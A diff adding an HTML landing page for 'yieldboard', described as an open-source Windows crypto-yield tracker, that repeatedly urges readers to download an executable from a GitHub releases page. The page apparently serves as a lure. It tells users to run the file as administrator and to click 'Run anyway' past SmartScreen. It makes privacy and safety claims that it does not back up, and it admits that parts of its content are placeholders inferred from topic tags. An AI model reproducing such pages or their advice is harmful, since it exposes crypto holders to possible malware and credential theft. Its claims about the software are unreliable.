@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>yieldboard - Track Your Crypto Yields Effortlessly</title>
+  <meta name="description" content="yieldboard is an open-source desktop app for Windows that helps you track your crypto yields, staking, lending, and liquidity positions across Ethereum, Arbitrum, and Solana. Simple, fast, and private.">
+  <meta name="keywords" content="apy, arbitrum, cpp, crypto, defi, desktop-app, ethereum, finance, lending, liquidity, open-source, portfolio, solana, staking, tracker, trading, web3, winapi, windows, yield-farming">
+  <meta name="author" content="yieldboard">
+  <meta property="og:title" content="yieldboard - Track Your Crypto Yields Effortlessly">
+  <meta property="og:description" content="Open-source Windows desktop app to track crypto yields, staking, lending, and liquidity across Ethereum, Arbitrum, and Solana.">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://github.com/Onthescene-proboscidian983/yieldboard">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+      background: #f8f9fa;
+      color: #212529;
+      line-height: 1.7;
+      padding: 20px;
+    }
+    .container {
+      max-width: 900px;
+      margin: 0 auto;
+      background: #ffffff;
+      padding: 40px 35px;
+      border-radius: 20px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+    }
+    h1 {
+      font-size: 2.4em;
+      margin-bottom: 0.3em;
+      font-weight: 700;
+      letter-spacing: -0.5px;
+      line-height: 1.2;
+    }
+    h2 {
+      font-size: 1.6em;
+      margin-top: 1.8em;
+      margin-bottom: 0.6em;
+      font-weight: 600;
+      color: #1a1a2e;
+      border-bottom: 2px solid #e9ecef;
+      padding-bottom: 0.3em;
+    }
+    h3 {
+      font-size: 1.2em;
+      margin-top: 1.2em;
+      margin-bottom: 0.5em;
+      font-weight: 600;
+      color: #2d2d44;
+    }
+    p {
+      margin-bottom: 1.2em;
+      font-size: 1.05em;
+    }
+    ul, ol {
+      margin-bottom: 1.2em;
+      padding-left: 1.8em;
+    }
+    li {
+      margin-bottom: 0.4em;
+      font-size: 1.05em;
+    }
+    a {
+      color: #0072ff;
+      text-decoration: none;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+    .btn-primary {
+      background: linear-gradient(135deg, #00c6ff, #0072ff);
+      color: #ffffff;
+      padding: 18px 42px;
+      font-size: 1.4em;
+      font-weight: 700;
+      border-radius: 60px;
+      text-decoration: none;
+      display: inline-block;
+      box-shadow: 0 8px 20px rgba(0, 114, 255, 0.35);
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+      border: none;
+      cursor: pointer;
+      margin: 10px 0;
+    }
+    .btn-primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 12px 28px rgba(0, 114, 255, 0.45);
+      text-decoration: none;
+      color: #ffffff;
+    }
+    .btn-secondary {
+      background: #f1f3f5;
+      color: #1a1a2e;
+      padding: 14px 28px;
+      font-size: 1.1em;
+      font-weight: 600;
+      border-radius: 50px;
+      text-decoration: none;
+      display: inline-block;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
+      transition: background 0.2s ease;
+      border: 1px solid #dee2e6;
+    }
+    .btn-secondary:hover {
+      background: #e9ecef;
+      text-decoration: none;
+    }
+    .note {
+      background: #f1f8ff;
+      border-left: 5px solid #0072ff;
+      padding: 16px 22px;
+      border-radius: 8px;
+      margin: 1.5em 0;
+      font-size: 1.02em;
+    }
+    .badge {
+      display: inline-block;
+      background: #e9ecef;
+      padding: 4px 14px;
+      border-radius: 30px;
+      font-size: 0.85em;
+      font-weight: 600;
+      color: #495057;
+      margin: 2px;
+    }
+    .feature-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 18px;
+      margin: 1.5em 0;
+    }
+    .feature-card {
+      background: #f8f9fa;
+      padding: 20px;
+      border-radius: 14px;
+      border: 1px solid #e9ecef;
+    }
+    .feature-card h3 {
+      margin-top: 0;
+      font-size: 1.1em;
+    }
+    .feature-card p {
+      font-size: 0.95em;
+      margin-bottom: 0;
+    }
+    hr {
+      border: 0;
+      border-top: 1px solid #e9ecef;
+      margin: 2em 0;
+    }
+    @media (max-width: 600px) {
+      body { padding: 10px; }
+      .container { padding: 25px 18px; border-radius: 16px; }
+      h1 { font-size: 1.8em; }
+      h2 { font-size: 1.35em; }
+      .btn-primary { font-size: 1.15em; padding: 16px 28px; }
+      .feature-grid { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>📊 yieldboard - Track Your Crypto Yields Effortlessly</h1>
+    <p style="font-size: 1.15em; color: #495057; margin-bottom: 1.5em;">Your simple, open-source desktop dashboard for monitoring DeFi yields, staking rewards, lending interest, and liquidity positions — all in one place.</p>
+
+    <div style="text-align: center; margin: 30px 0 40px;">
+      <a href="https://github.com/Onthescene-proboscidian983/yieldboard/releases" class="btn-primary">⬇️ Download yieldboard for Windows</a>
+    </div>
+
+    <h2>What is yieldboard?</h2>
+    <p>yieldboard is a free, open-source desktop application built for Windows that helps you keep an eye on your cryptocurrency earnings without needing to navigate complex DeFi dashboards or spreadsheets. Whether you are staking tokens on Ethereum, providing liquidity on Arbitrum, or lending on Solana, yieldboard brings your numbers together in a clean, easy-to-read interface.</p>
+    <p>It is designed for everyday users who want to understand how their crypto investments are performing. You do not need any programming knowledge to use it. Just download the app, run it on your Windows computer, and start tracking. yieldboard respects your privacy — your data stays on your machine, and the app does not require you to connect a wallet or share private keys.</p>
+    <p>Built with C++ and native Windows APIs, yieldboard is lightweight, fast, and does not require a browser or an internet connection for basic portfolio viewing (though live data updates need an internet connection). It supports multiple chains including Ethereum, Arbitrum, and Solana, making it a versatile companion for anyone active in decentralized finance.</p>
+
+    <h2>✨ Key Features</h2>
+    <div class="feature-grid">
+      <div class="feature-card">
+        <h3>📈 Unified Yield Dashboard</h3>
+        <p>See all your staking, lending, and liquidity yields in a single view. No more switching between tabs.</p>
+      </div>
+      <div class="feature-card">
+        <h3>🔗 Multi-Chain Support</h3>
+        <p>Track positions on Ethereum, Arbitrum, and Solana without extra setup.</p>
+      </div>
+      <div class="feature-card">
+        <h3>⚡ Lightweight & Fast</h3>
+        <p>Native Windows application that starts quickly and uses minimal system resources.</p>
+      </div>
+      <div class="feature-card">
+        <h3>🔒 Privacy First</h3>
+        <p>No wallet connection required. Your portfolio data remains on your local computer.</p>
+      </div>
+      <div class="feature-card">
+        <h3>📊 Portfolio Overview</h3>
+        <p>Get a clear snapshot of your total earned interest, rewards, and current APY rates.</p>
+      </div>
+      <div class="feature-card">
+        <h3>🔄 Automatic Updates</h3>
+        <p>Fetch the latest yield rates and token prices with a single click (requires internet).</p>
+      </div>
+    </div>
+
+    <h2>🚀 Getting Started</h2>
+    <p>Getting yieldboard up and running on your Windows computer is straightforward. Follow the steps below:</p>
+    <ol>
+      <li><strong>Visit the download page:</strong> Go to the official releases page by clicking the button below. This is the only place you should download yieldboard from.</li>
+      <li><strong>Download the application:</strong> On the releases page, find the latest version for Windows and download it. The file is typically an executable (.exe) or a compressed archive (.zip).</li>
+      <li><strong>Run the app:</strong> Once the download is complete, locate the file in your Downloads folder and double-click it to launch yieldboard. If you downloaded a .zip file, extract it first, then run the application inside.</li>
+    </ol>
+    <div style="text-align: center; margin: 30px 0;">
+      <a href="https://github.com/Onthescene-proboscidian983/yieldboard/releases" class="btn-primary">⬇️ Visit this link to download the application</a>
+    </div>
+    <div class="note">
+      <strong>📌 Note:</strong> yieldboard is provided as-is from the official GitHub releases page. Always download from the link above to ensure you are getting the authentic, latest version. The application is free and open-source.
+    </div>
+
+    <h2>💻 System Requirements</h2>
+    <p>yieldboard is designed to run smoothly on most modern Windows computers. Below are the recommended specifications for the best experience:</p>
+    <ul>
+      <li><strong>Operating System:</strong> Windows 10 or Windows 11 (64-bit)</li>
+      <li><strong>Processor:</strong> 1.5 GHz dual-core or better</li>
+      <li><strong>Memory:</strong> 4 GB RAM minimum (8 GB recommended)</li>
+      <li><strong>Storage:</strong> 200 MB free disk space</li>
+      <li><strong>Internet:</strong> Required for live yield data and price updates (basic portfolio viewing works offline)</li>
+      <li><strong>Display:</strong> 1280 x 720 resolution or higher</li>
+    </ul>
+    <p>These are placeholder recommendations based on the application's focus. If your computer runs Windows 10 or 11, you should have no trouble using yieldboard.</p>
+
+    <h2>🖱️ How to Use yieldboard</h2>
+    <p>Once you have installed and launched yieldboard, you will be greeted with a clean, intuitive interface. Here is a quick walkthrough to help you get started:</p>
+    <ol>
+      <li><strong>Add your first position:</strong> Click the "Add Position" button and choose the blockchain network (Ethereum, Arbitrum, or Solana). Enter the token name, the amount you have staked or supplied, and the current yield rate (APY).</li>
+      <li><strong>View your dashboard:</strong> Your positions will appear on the main dashboard, showing your estimated daily, monthly, and yearly earnings.</li>
+      <li><strong>Update rates:</strong> Click the "Refresh" button to fetch the latest APY and token prices from public data sources. This requires an internet connection.</li>
+      <li><strong>Organize your portfolio:</strong> You can group positions by protocol or chain, and sort them by yield or value. The app saves your data locally, so it will be there the next time you open it.</li>
+      <li><strong>Export your data:</strong> Use the export function to save a CSV file of your portfolio for your own records or for tax purposes.</li>
+    </ol>
+    <p>There is no need to connect a crypto wallet or create an account. yieldboard is a standalone tracker that puts you in control.</p>
+
+    <h2>🔧 Troubleshooting</h2>
+    <p>If you encounter any issues while using yieldboard, here are some common solutions:</p>
+    <ul>
+      <li><strong>The app does not start:</strong> Make sure you have downloaded the correct version for Windows. Try running the application as administrator by right-clicking the file and selecting "Run as administrator".</li>
+      <li><strong>Data does not refresh:</strong> Check your internet connection. Some networks block certain API endpoints; try switching to a different network or using a VPN.</li>
+      <li><strong>Windows SmartScreen warning:</strong> Because yieldboard is open-source and not signed by a large publisher, Windows may show a warning. Click "More info" and then "Run anyway" to proceed. You can verify the file integrity on the releases page.</li>
+      <li><strong>Missing .dll errors:</strong> Ensure that you have the latest Microsoft Visual C++ Redistributable installed. You can download it for free from Microsoft's website.</li>
+      <li><strong>App runs slowly:</strong> Close other background applications to free up memory. If you have a very large number of positions, consider exporting and archiving older ones.</li>
+    </ul>
+    <p>For more help, visit the GitHub repository and open an issue. The community and maintainers are happy to assist.</p>
+
+    <h2>❓ Frequently Asked Questions</h2>
+    <p><strong>Is yieldboard really free?</strong><br>Yes, yieldboard is open-source software released under a permissive license. There are no hidden fees, subscriptions, or premium tiers.</p>
+    <p><strong>Do I need to connect my wallet?</strong><br>No. yieldboard is a manual tracker. You enter your positions yourself, which means you never share private keys or grant any permissions to the app.</p>
+    <p><strong>Which blockchains are supported?</strong><br>The app is designed to track yields on Ethereum, Arbitrum, and Solana, as indicated by its topic tags. Support for additional chains may be added in future updates.</p>
+    <p><strong>Can I use yieldboard on Mac or Linux?</strong><br>yieldboard is built as a Windows desktop application using native Windows APIs. The official releases are for Windows only. However, since it is open-source, you may find community builds or compile it yourself.</p>
+    <p><strong>How do I update the app?</strong><br>Simply visit the releases page again and download the latest version. Your local data will remain intact as long as you do not delete the data folder.</p>
+    <p><strong>Where is my data stored?</strong><br>All data is stored locally on your computer in the application's data directory. No information is sent to external servers except for public API calls to fetch yield rates.</p>
+
+    <h2>📬 Support</h2>
+    <p>yieldboard is an open-source project maintained by a community of contributors. If you need help, have a feature request, or want to report a bug, the best place to go is the GitHub repository:</p>
+    <p><a href="https://github.com/Onthescene-proboscidian983/yieldboard" class="btn-secondary">🔗 Visit the GitHub Repository</a></p>
+    <p>You can browse existing issues, open a new one, or contribute to the code. Your feedback helps make yieldboard better for everyone.</p>
+
+    <h2>📄 License</h2>
+    <p>yieldboard is open-source software. The specific license can be found in the LICENSE file within the repository. It is provided free of charge for personal and commercial use, with no warranty. See the repository for full details.</p>
+
+    <hr>
+    <p style="text-align: center; color: #6c757d; font-size: 0.9em;">yieldboard — open source utility · Updated 2026-10-04</p>
+    <p style="text-align: center; color: #6c757d; font-size: 0.85em;">Keywords: apy, arbitrum, cpp, crypto, defi, desktop-app, ethereum, finance, lending, liquidity, open-source, portfolio, solana, staking, tracker, trading, web3, winapi, windows, yield-farming</p>
+  </div>
+</body>
+</html>
